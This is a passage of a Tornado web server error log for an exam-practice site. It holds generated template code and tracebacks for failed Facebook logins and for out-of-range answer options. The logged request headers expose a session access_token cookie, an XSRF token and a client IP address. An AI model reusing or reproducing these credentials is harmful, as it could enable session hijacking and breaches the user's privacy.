25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c71cb8e4c854802b2dbd0&answers=%5B3%5D&cursor=5&_xsrf=a9a493ca6afd411489ccdc9f4d4ca8c8', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '84.9.121.159', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFHRVIxeldLSVB3Yml6OUh2N2xxSXFoZWxLTnJHV0hJU1ZCUzl1aUNaQm1OSFFCcmtnRHZKODVaQkNQV0h6bERrbUo1a2Y2WE9LV01rNFpCWkNaQ3NSeDBxdUNkazJnWkRaRA==|1348235303|d679657a3903ec4fe6bc677a3fff48f388a4426f"; _xsrf=a9a493ca6afd411489ccdc9f4d4ca8c8; __utma=188782963.305177804.1348235222.1348235222.1348235222.1; __utmb=188782963.5.10.1348235222; __utmc=188782963; __utmz=188782963.1348235222.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 156.66ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c71cb8e4c854802b2dbd0&answers=%5B0%5D&cursor=9&_xsrf=a9a493ca6afd411489ccdc9f4d4ca8c8', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '84.9.121.159', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFHRVIxeldLSVB3Yml6OUh2N2xxSXFoZWxLTnJHV0hJU1ZCUzl1aUNaQm1OSFFCcmtnRHZKODVaQkNQV0h6bERrbUo1a2Y2WE9LV01rNFpCWkNaQ3NSeDBxdUNkazJnWkRaRA==|1348235303|d679657a3903ec4fe6bc677a3fff48f388a4426f"; _xsrf=a9a493ca6afd411489ccdc9f4d4ca8c8; __utma=188782963.305177804.1348235222.1348235222.1348235222.1; __utmb=188782963.5.10.1348235222; __utmc=188782963; __utmz=188782963.1348235222.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 73.03ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
